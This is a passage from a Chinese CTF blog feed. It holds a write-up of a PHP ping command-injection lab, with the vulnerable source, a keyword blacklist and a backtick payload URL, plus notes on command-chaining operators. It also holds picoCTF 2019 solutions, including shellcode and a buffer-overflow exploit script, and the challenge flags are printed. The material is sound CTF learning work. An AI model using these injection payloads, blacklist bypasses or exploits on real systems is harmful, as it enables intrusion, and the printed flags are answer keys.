class="line">    &lt;title&gt;Ping&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">"."</span> method=<span class="string">"GET"</span>&gt;</span><br><span class="line">        IP: &lt;input type=<span class="string">"text"</span> name=<span class="string">"ip"</span>&gt; &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Ping"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;<span class="meta">&lt;?php</span></span><br><span class="line">        $blacklist = [</span><br><span class="line">            <span class="string">'flag'</span>, <span class="string">'cat'</span>, <span class="string">'nc'</span>, <span class="string">'sh'</span>, <span class="string">'cp'</span>, <span class="string">'touch'</span>, <span class="string">'mv'</span>, <span class="string">'rm'</span>, <span class="string">'ps'</span>, <span class="string">'top'</span>, <span class="string">'sleep'</span>, <span class="string">'sed'</span>,</span><br><span class="line">            <span class="string">'apt'</span>, <span class="string">'yum'</span>, <span class="string">'curl'</span>, <span class="string">'wget'</span>, <span class="string">'perl'</span>, <span class="string">'python'</span>, <span class="string">'zip'</span>, <span class="string">'tar'</span>, <span class="string">'php'</span>, <span class="string">'ruby'</span>, <span class="string">'kill'</span>,</span><br><span class="line">            <span class="string">'passwd'</span>, <span class="string">'shadow'</span>, <span class="string">'root'</span>,</span><br><span class="line">            <span class="string">'z'</span>,</span><br><span class="line">            <span class="string">'dir'</span>, <span class="string">'dd'</span>, <span class="string">'df'</span>, <span class="string">'du'</span>, <span class="string">'free'</span>, <span class="string">'tempfile'</span>, <span class="string">'touch'</span>, <span class="string">'tee'</span>, <span class="string">'sha'</span>, <span class="string">'x64'</span>, <span class="string">'g'</span>,</span><br><span class="line">            <span class="string">'xargs'</span>, <span class="string">'PATH'</span>,</span><br><span class="line">            <span class="string">'$0'</span>, <span class="string">'proc'</span>,</span><br><span class="line">            <span class="string">'/'</span>, <span class="string">'&amp;'</span>, <span class="string">'|'</span>, <span class="string">'&gt;'</span>, <span class="string">'&lt;'</span>, <span class="string">';'</span>, <span class="string">'"'</span>, <span class="string">'\''</span>, <span class="string">'\\'</span>, <span class="string">"\n"</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        set_time_limit(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">($ip)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> $blacklist;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(strlen($ip) &gt; <span class="number">15</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'IP toooooo longgggggggggg'</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">foreach</span>($blacklist <span class="keyword">as</span> $keyword) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(strstr($ip, $keyword)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">"&#123;$keyword&#125; not allowed"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $ret = [];</span><br><span class="line">                exec(<span class="string">"ping -c 1 \"&#123;$ip&#125;\" 2&gt;&amp;1"</span>, $ret);</span><br><span class="line">                <span class="keyword">return</span> implode(<span class="string">"\n"</span>, array_slice($ret, <span class="number">0</span>, <span class="number">10</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">'ip'</span>]))</span><br><span class="line">            <span class="keyword">echo</span> htmlentities(ping($_GET[<span class="string">'ip'</span>]));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="meta">?&gt;</span>&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>可以发现是一道php的命令执行注入题,黑名单里过滤了很多命令,但是很多通配符没有过滤比如’$’,’`‘,’*‘等</p><p>‘`‘在php中也叫执行运算符，使用时等同于<code>shell_exec()</code>函数,命令执行时PHP将尝试将反引号中的内容作为 shell命令来执行，并将其输出信息返回</p><p>而exec()函数里的ping命令,表示只发一个request包且标准输出重定向到我们输入的命令,即在终端上执行我们输入的命令,形成注入漏洞,所以可以先尝试读取文件</p><figure class="image-box">                <img src="./1.png" alt="图片" title class>                <p>图片</p>            </figure><p>可以发现命令执行成功,这时候就可以从shell命令着手,尝试读取flag.php</p><p>在shell中,读取文件时的<code>*</code>表示任意数目的任意字符,在正则中表示重复前面的字符任意多次（包括0次）,两者在指明文件时的用法也不一样,正则里要用<code>^</code>表示匹配字符串开头,或用<code>+</code>表示匹配前面的字符1次或多次,在这道题里仅用<code>f*</code>即可指明为flag.php,其他题目读取时同理</p><p>由此可以构造payload: </p><p><a href="http://172.17.135.48:20088/?ip=`head%20f*`" target="_blank" rel="noopener">http://172.17.135.48:20088/?ip=<code>head%20f*</code></a></p><figure class="image-box">                <img src="./2.png" alt="图片" title class>                <p>图片</p>            </figure><p>得到flag:  flag{Y0u_s01ve_1t_!!1}</p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>linux里用来读文件的命令很多,灵活使用可以绕过很多黑名单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat    由第一行开始显示文件内容</span><br><span class="line">tac    从最后一行开始显示，可以看出 tac 是 cat 的倒着写</span><br><span class="line">nl     显示的时候，顺道输出行号</span><br><span class="line">more   一页一页的显示文件内容</span><br><span class="line">less   与 more 类似，但是比 more 更好的是，可以往前翻页</span><br><span class="line">head   只看头几行</span><br><span class="line">tail   只看尾巴几行</span><br><span class="line">sort   可以在读取文件时进行排序输出</span><br></pre></td></tr></table></figure></p><p>此外还有关于使用管道符拼接执行命令的操作,顺便记录一下</p><ul><li>Windows管道符</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">“|”:直接执行后面的语句。如:ping 127.0.0.1|whoami</span><br><span class="line"></span><br><span class="line">“||”:如果前面执行的语句出错泽执行后面的语句，前面的语句智能为假 如：ping 2 || whoami</span><br><span class="line"></span><br><span class="line">“&amp;”:如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 如 ping 127.0.0.1&amp;whoami</span><br><span class="line"></span><br><span class="line">“&amp;&amp;”:如果前面的语句为假则直接出错,也不执行后面的语句，前面的语句只能为真。例如:ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure><ul><li>Linux管道符</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">“;”:执行完前面的语句再执行后面的 例如:ping 127.0.0.1;whoami</span><br><span class="line"></span><br><span class="line">“|”:显示后面语句的执行结果 例如:ping 127.0.0.1|whoami</span><br><span class="line"></span><br><span class="line">“||”:当前面的语句只能怪出错时，执行后面的语句，例如:ping 1||whoami</span><br><span class="line"></span><br><span class="line">“&amp;”:如果当前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如:ping 127.0.0.1&amp;whoami</span><br><span class="line"></span><br><span class="line">“&amp;&amp;”:如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真 例如:ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;20088靶场wp&quot;&gt;&lt;a href=&quot;#20088靶场wp&quot; class=&quot;headerlink&quot; title=&quot;20088靶场wp&quot;&gt;&lt;/a&gt;20088靶场wp&lt;/h2&gt;&lt;p&gt;链接: &lt;a href=&quot;http://172.17.135.48:20088&quot; t
      
    
    </summary>
    
    
      <category term="ctf writeup web" scheme="https://www.damyahome.github.io/categories/ctf-writeup-web/"/>
    
    
      <category term="靶场练习" scheme="https://www.damyahome.github.io/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>2019picoCTF部分wp(5000分记录)</title>
    <link href="https://www.damyahome.github.io/2019picoCTF-5000%E5%88%86wp/"/>
    <id>https://www.damyahome.github.io/2019picoCTF-5000%E5%88%86wp/</id>
    <published>2019-11-10T13:52:28.000Z</published>
    <updated>2019-11-20T12:31:06.531Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一般技能"><a href="#一般技能" class="headerlink" title="一般技能"></a>一般技能</h1><h2 id="The-Factory’s-Secret-Points-1"><a href="#The-Factory’s-Secret-Points-1" class="headerlink" title="The Factory’s Secret - Points: 1"></a>The Factory’s Secret - Points: 1</h2><blockquote><p>There appear to be some mysterious glyphs hidden inside this abandoned factory… I wonder what would happen if you collected them all?</p></blockquote><blockquote><p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘hello’, you would submit ‘picoCTF{hello}’ as the flag.</p></blockquote><p>游戏题,需要做完所有题目才能通关</p><h2 id="2Warm-Points-50"><a href="#2Warm-Points-50" class="headerlink" title="2Warm - Points: 50"></a>2Warm - Points: 50</h2><blockquote><p>Can you convert the number 42 (base 10) to binary (base 2)?</p></blockquote><blockquote><p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘11111’, you would submit ‘picoCTF{11111}’ as the flag.</p></blockquote><p>42–&gt;101010</p><p>picoCTF{101010}</p><h2 id="Lets-Warm-Up-Points-50"><a href="#Lets-Warm-Up-Points-50" class="headerlink" title="Lets Warm Up - Points: 50"></a>Lets Warm Up - Points: 50</h2><blockquote><p>If I told you a word started with 0x70 in hexadecimal, what would it start with in ASCII?</p></blockquote><blockquote><p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘hello’, you would submit ‘picoCTF{hello}’ as the flag.</p></blockquote><p>0x70–&gt;p</p><p>picoCTF{p}</p><h2 id="Warmed-Up-Points-50"><a href="#Warmed-Up-Points-50" class="headerlink" title="Warmed Up - Points: 50"></a>Warmed Up - Points: 50</h2><blockquote><p>What is 0x3D (base 16) in decimal (base 10).</p></blockquote><blockquote><p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘22’, you would submit ‘picoCTF{22}’ as the flag.</p></blockquote><p>0x3D–&gt;41</p><p>picoCTF{41}</p><h2 id="Bases-Points-100"><a href="#Bases-Points-100" class="headerlink" title="Bases - Points: 100"></a>Bases - Points: 100</h2><blockquote><p>What does this bDNhcm5fdGgzX3IwcDM1 mean? I think it has something to do with bases.</p></blockquote><blockquote><p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘hello’, you would submit ‘picoCTF{hello}’ as the flag.</p></blockquote><p>base64解密</p><p>picoCTF{l3arn_th3_r0p35}</p><h2 id="First-Grep-Points-100"><a href="#First-Grep-Points-100" class="headerlink" title="First Grep - Points: 100"></a>First Grep - Points: 100</h2><blockquote><p>Can you find the flag in file? This would be really tedious to look through manually, something tells me there is a better way. You can also find the file in /problems/first-grep_6_c2319e8af66fa6bec197edc733dd52dd on the shell server.</p></blockquote><blockquote><p>Hints: grep <a href="https://ryanstutorials.net/linuxtutorial/grep.php" target="_blank" rel="noopener">tutorial</a></p></blockquote><p>拖进winhex里,搜索字符</p><figure class="image-box">                <img src="./1.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{grep_is_good_to_find_things_cdb327ab}</p><h2 id="Resources-Points-100"><a href="#Resources-Points-100" class="headerlink" title="Resources - Points: 100"></a>Resources - Points: 100</h2><blockquote><p>We put together a bunch of resources to help you out on our website! If you go over there, you might even find a flag! <a href="https://picoctf.com/resources" target="_blank" rel="noopener">https://picoctf.com/resources</a> (link)</p></blockquote><figure class="image-box">                <img src="./2.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{r3source_pag3_f1ag}</p><h2 id="strings-it-Points-100"><a href="#strings-it-Points-100" class="headerlink" title="strings it - Points: 100"></a>strings it - Points: 100</h2><blockquote><p>Can you find the flag in file without running it? You can also find the file in /problems/strings-it_5_1fd17da9526a76a4fffce289dee10fbb on the shell server.</p></blockquote><blockquote><p>Hints: <a href="https://linux.die.net/man/1/strings" target="_blank" rel="noopener">strings</a><br>执行strins命令,查找flag</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings strings | grep picoCTF</span><br></pre></td></tr></table></figure><p>picoCTF{5tRIng5_1T_dd38f284}</p><h2 id="what’s-a-net-cat-Points-100"><a href="#what’s-a-net-cat-Points-100" class="headerlink" title="what’s a net cat? - Points: 100"></a>what’s a net cat? - Points: 100</h2><blockquote><p>Using netcat (nc) is going to be pretty important. Can you connect to 2019shell1.picoctf.com at port 21865 to get the flag?</p></blockquote><blockquote><p>Hints: nc <a href="https://linux.die.net/man/1/nc" target="_blank" rel="noopener">tutorial</a></p></blockquote><figure class="image-box">                <img src="./3.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{nEtCat_Mast3ry_4fefb685}</p><h2 id="Based-Points-200"><a href="#Based-Points-200" class="headerlink" title="Based - Points: 200"></a>Based - Points: 200</h2><blockquote><p>To get truly 1337, you must understand different data encodings, such as hexadecimal or binary. Can you get the flag from this program to prove you are on the way to becoming 1337? Connect with nc 2019shell1.picoctf.com 29594.</p></blockquote><blockquote><p>Hints: I hear python can convert things.<br>  It might help to have multiple windows open</p></blockquote><p>简单的进制转换,嫌麻烦不想写脚本的话网上都有在线转换</p><figure class="image-box">                <img src="./4.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{learning_about_converting_values_e67b1990}</p><h2 id="First-Grep-Part-II-Points-200"><a href="#First-Grep-Part-II-Points-200" class="headerlink" title="First Grep: Part II - Points: 200"></a>First Grep: Part II - Points: 200</h2><blockquote><p>Can you find the flag in /problems/first-grep–part-ii_4_ca16fbcd16c92f0cb1e376a6c188d58f/files on the shell server? Remember to use grep.</p></blockquote><blockquote><p>Hints: grep <a href="https://ryanstutorials.net/linuxtutorial/grep.php" target="_blank" rel="noopener">tutorial</a></p></blockquote><p>使用命令,在当前目录下的多个文件中查找关键词</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">'picoCTF'</span> . -Rn</span><br></pre></td></tr></table></figure><p>得到输出<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./files6/file5:2:picoCTF&#123;grep_r_to_find_this_0e28f3ee&#125;</span><br></pre></td></tr></table></figure></p><h2 id="plumbing-Points-200"><a href="#plumbing-Points-200" class="headerlink" title="plumbing - Points: 200"></a>plumbing - Points: 200</h2><blockquote><p>Sometimes you need to handle process data outside of a file. Can you find a way to keep the output from this program and search for the flag? Connect to 2019shell1.picoctf.com 18944.</p></blockquote><blockquote><p>Hints: Remember the flag format is picoCTF{XXXX}<br>  What’s a pipe? No not that kind of pipe… This <a href="http://www.linfo.org/pipes.html" target="_blank" rel="noopener">kind</a></p></blockquote><p>输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 2019shell1.picoctf.com 18944 | grep picoCTF</span><br></pre></td></tr></table></figure><p>picoCTF{digital_plumb3r_1d5b7de7}</p><h2 id="where-is-the-file-Points-200"><a href="#where-is-the-file-Points-200" class="headerlink" title="where-is-the-file - Points: 200"></a>where-is-the-file - Points: 200</h2><blockquote><p>I’ve used a super secret mind trick to hide this file. Maybe something lies in /problems/where-is-the-file_6_8eae99761e71a8a21d3b82ac6cf2a7d0.</p></blockquote><blockquote><p>Hints: What command can see/read files?<br>  What’s in the manual page of ls?</p></blockquote><figure class="image-box">                <img src="./5.png" alt="图片" title class>                <p>图片</p>            </figure><p>ls -a 参数能查看隐藏文件</p><p>picoCTF{w3ll_that_d1dnt_w0RK_a88d16e4}</p><h1 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h1><h2 id="handy-shellcode-Points-50"><a href="#handy-shellcode-Points-50" class="headerlink" title="handy-shellcode - Points: 50"></a>handy-shellcode - Points: 50</h2><blockquote><p>This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_0_24753fd2c78ac1a60682f0c924b23405 on the shell server. Source.</p></blockquote><blockquote><p>Hints: You might be able to find some good shellcode online.</p></blockquote><p>在比赛的shell里输入exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">'vuln'</span>)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">'\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>picoCTF{h4ndY_d4ndY_sh311c0d3_ce07e7f1}</p><h2 id="practice-run-1-Points-50"><a href="#practice-run-1-Points-50" class="headerlink" title="practice-run-1 - Points: 50"></a>practice-run-1 - Points: 50</h2><blockquote><p>You’re going to need to know how to run programs if you’re going to get out of here. Navigate to /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e on the shell server and run this program to receive a flag.</p></blockquote><blockquote><p>Hints: How do you execute a program in a command line?</p></blockquote><figure class="image-box">                <img src="./6.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{g3t_r3adY_2_r3v3r53}</p><h2 id="OverFlow-0-Points-100"><a href="#OverFlow-0-Points-100" class="headerlink" title="OverFlow 0 - Points: 100"></a>OverFlow 0 - Points: 100</h2><blockquote><p>This should be easy. Overflow the correct buffer in this program and get a flag. Its also found in /problems/overflow-0_6_1279241c50d050a1045301d7970f2fe3 on the shell server. Source.</p></blockquote><blockquote><p>Hints: Find a way to trigger the flag to print<br>  If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren’t expecting.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> flag[FLAGSIZE_MAX];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigsegv_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, flag);</span><br><span class="line">  fflush(<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *input)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  FILE *f = fopen(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag,FLAGSIZE_MAX,f);</span><br><span class="line">  signal(SIGSEGV, sigsegv_handler);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    vuln(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You entered: %s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please enter an argument next time\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入的参数没有限制大小造成在vuln函数里面strcpy至buf时可能导致栈溢出,可以从0x804a080开始覆盖<br>执行exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">'./vuln'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./vuln'</span>)</span><br><span class="line">flag_addr = <span class="number">0x804a080</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">buf = <span class="string">'a'</span>*<span class="number">0x90</span></span><br><span class="line">payload  = buf + <span class="string">'aaaa'</span></span><br><span class="line">payload += p32(puts_plt) + <span class="string">'aaaa'</span> + p32(flag_addr)</span><br><span class="line">p = process(argv=[<span class="string">'./vuln'</span>, payload])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./7.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{3asY_P3a5yd4a28467}</p><h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="The-Numbers-Points-50"><a href="#The-Numbers-Points-50" class="headerlink" title="The Numbers - Points: 50"></a>The Numbers - Points: 50</h2><blockquote><p>The numbers… what do they mean?</p></blockquote><blockquote><p>Hints: The flag is in the format PICOCTF{}</p></blockquote><p>16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14}</p><p>对应字母表A-Z</p><p>PICOCTF{THENUMBERSMASON}</p><h2 id="13-Points-100"><a href="#13-Points-100" class="headerlink" title="13 - Points: 100"></a>13 - Points: 100</h2><blockquote><p>Cryptography can be easy, do you know what ROT13 is? cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}</p></blockquote><blockquote><p>Hints: This can be solved online if you don’t want to do it by hand!</p></blockquote><p>解凯撒密码</p><figure class="image-box">                <img src="./8.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{not_too_bad_of_a_problem}</p><h2 id="Easy1-Points-100"><a href="#Easy1-Points-100" class="headerlink" title="Easy1 - Points: 100"></a>Easy1 - Points: 100</h2><blockquote><p>The one time pad can be cryptographically secure, but not when you know the key. Can you solve this? We’ve given you the encrypted flag, key, and a table to help UFJKXQZQUNB with the key of SOLVECRYPTO. Can you use this table to solve it?.</p></blockquote><blockquote><p>Hints: Submit your answer in our competition’s flag format. For example, if you answer was ‘hello’, you would submit ‘picoCTF{HELLO}’ as the flag.<br>  Please use all caps for the message.</p></blockquote><p>维吉尼亚密码解密</p><figure class="image-box">                <img src="./9.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{CRYPTOISFUN}</p><h2 id="caesar-Points-100"><a href="#caesar-Points-100" class="headerlink" title="caesar - Points: 100"></a>caesar - Points: 100</h2><blockquote><p>Decrypt this message. You can find the ciphertext in /problems/caesar_4_33e5994add902b2321c8c38c8b962eff on the shell server.</p></blockquote><blockquote><p>Hints: caesar cipher tutorial</p></blockquote><p>在线解凯撒密码,整出一个看上去挺正常的</p><figure class="image-box">                <img src="./10.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{crossingtherubiconljmawiae}</p><h2 id="Flags-Points-200"><a href="#Flags-Points-200" class="headerlink" title="Flags - Points: 200"></a>Flags - Points: 200</h2><blockquote><p>What do the flags mean?</p></blockquote><blockquote><p>Hints: The flag is in the format PICOCTF{}</p></blockquote><figure class="image-box">                <img src="./11.png" alt="图片" title class>                <p>图片</p>            </figure><p>国际海事信号旗图标+数字旗号</p><p>PICOCTF{F1AG5AND5TUFF}</p><h2 id="Tapping-Points-200"><a href="#Tapping-Points-200" class="headerlink" title="Tapping - Points: 200"></a>Tapping - Points: 200</h2><blockquote><p>Theres tapping coming in from the wires. What’s it saying nc 2019shell1.picoctf.com 37911.</p></blockquote><blockquote><p>Hints: What kind of encoding uses dashes and dots?<br>  The flag is in the format PICOCTF{}</p></blockquote><p>nc过去后是摩斯密码,脚本解一下</p><figure class="image-box">                <img src="./12.png" alt="图片" title class>                <p>图片</p>            </figure><p>PICOCTF{M0RS3C0D31SFUN2265937663}</p><h2 id="la-cifra-de-Points-200"><a href="#la-cifra-de-Points-200" class="headerlink" title="la cifra de - Points: 200"></a>la cifra de - Points: 200</h2><blockquote><p>I found this cipher in an old book. Can you figure out what it says? Connect with nc 2019shell1.picoctf.com 39776.</p></blockquote><blockquote><p>Hints: There are tools that make this easy.<br>  Perhaps looking at history will help</p></blockquote><p>1402Vigenère密码</p><p>学长给的破解网站  <a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">https://www.guballa.de/vigenere-solver</a></p><p>picoCTF{b311a50_0r_v1gn3r3_c1ph3r1119c336}</p><h2 id="waves-over-lambda-Points-300"><a href="#waves-over-lambda-Points-300" class="headerlink" title="waves over lambda - Points: 300"></a>waves over lambda - Points: 300</h2><blockquote><p>We made alot of substitutions to encrypt this. Can you decrypt it? Connect with nc 2019shell1.picoctf.com 32282.</p></blockquote><blockquote><p>Hints: Flag is not in the usual flag format</p></blockquote><p>破解网址  <a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a></p><p>用statistics模式</p><p>picoCTF{frequency_is_c_over_lambda_ptthttobuc}</p><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="Glory-of-the-Garden-Points-50"><a href="#Glory-of-the-Garden-Points-50" class="headerlink" title="Glory of the Garden - Points: 50"></a>Glory of the Garden - Points: 50</h2><blockquote><p>This garden contains more than it seems. You can also find the file in /problems/glory-of-the-garden_0_25ece79ae00914856938a4b19d0e31af on the shell server.</p></blockquote><blockquote><p>Hints: What is a hex editor?</p></blockquote><p>下载是张图片,拖进notepad里,结尾发现flag</p><figure class="image-box">                <img src="./13.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{more_than_m33ts_the_3y3f089EdF0}</p><h2 id="unzip-Points-50"><a href="#unzip-Points-50" class="headerlink" title="unzip - Points: 50"></a>unzip - Points: 50</h2><blockquote><p>Can you unzip this file and get the flag?</p></blockquote><blockquote><p>Hints: put the flag in the format picoCTF{XXXXX}</p></blockquote><p>我想多了!!flag就是图片上的文字</p><p>picoCTF{unz1pp1ng_1s_3a5y}</p><h2 id="So-Meta-Points-150"><a href="#So-Meta-Points-150" class="headerlink" title="So Meta - Points: 150"></a>So Meta - Points: 150</h2><blockquote><p>Find the flag in this picture. You can also find the file in /problems/so-meta_0_7c0b2ae7a38b024c6b1c68cf50970a88.</p></blockquote><blockquote><p>Hints: What does meta mean in the context of files?<br>  Ever hear of metadata?</p></blockquote><p>winhex打开,结尾发现flag</p><figure class="image-box">                <img src="./14.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{s0_m3ta_dc38ce45}</p><h2 